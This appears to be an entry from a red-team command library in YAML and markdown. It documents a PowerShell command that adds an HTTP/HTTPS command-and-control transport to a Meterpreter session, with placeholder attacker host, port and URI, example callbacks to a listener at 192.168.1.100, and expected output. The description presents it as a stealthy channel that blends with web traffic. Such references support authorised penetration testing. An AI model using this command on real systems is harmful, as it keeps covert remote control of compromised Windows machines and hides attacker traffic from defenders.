---
id: b05240f0-1727-4cc5-81d7-1491ec97b744
name: add-web-transport-to-meterpreter
type: command
executor: powershell
data: >-
  Add-WebTransport -Url http(s)://$_LHOST:$_LPORT/$_LURI -RetryWait $_RETRY_WAIT
  -RetryTotal $_RETRY_TOTAL
output: null
created_at: '2023-04-06T03:56:21.692488+00:00'
updated_at: '2023-04-10T20:24:56.696544+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - c2-transport
verified: true
validated: true
---

# add-web-transport-to-meterpreter

## Command

```powershell
Add-WebTransport -Url http(s)://$_LHOST:$_LPORT/$_LURI -RetryWait $_RETRY_WAIT -RetryTotal $_RETRY_TOTAL
```

## Description

This PowerShell command adds an HTTP/HTTPS web transport to a Meterpreter session, using a specified URL for staging communication. It provides a stealthy fallback channel that blends with web traffic, with built-in retries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Url http(s)://$_LHOST:$_LPORT/$_LURI | Full URL for web transport (include protocol, host, port, and local URI) | Yes |
| -RetryWait $_RETRY_WAIT | Seconds between retry attempts (default 10) | No |
| -RetryTotal $_RETRY_TOTAL | Total retry attempts (default 30) | No |

## Examples

### Basic Usage

```powershell
Add-WebTransport -Url https://192.168.1.100:443/stager -RetryWait 10 -RetryTotal 30
```

### Advanced Usage

For HTTP without TLS:
```powershell
Add-WebTransport -Url http://192.168.1.100:8080/stager -RetryWait 15 -RetryTotal 20
```

## Expected Output

[*] Adding Web transport: https://192.168.1.100:443/stager
[*] Web transport added with retry configuration.

The session updates to include the web channel, verifiable with `transport`.

## Related

- [[procedures/Metasploit-Multiple-Transports-Payload-Generator]]
- [[commands/add-tcp-transport-to-meterpreter]]
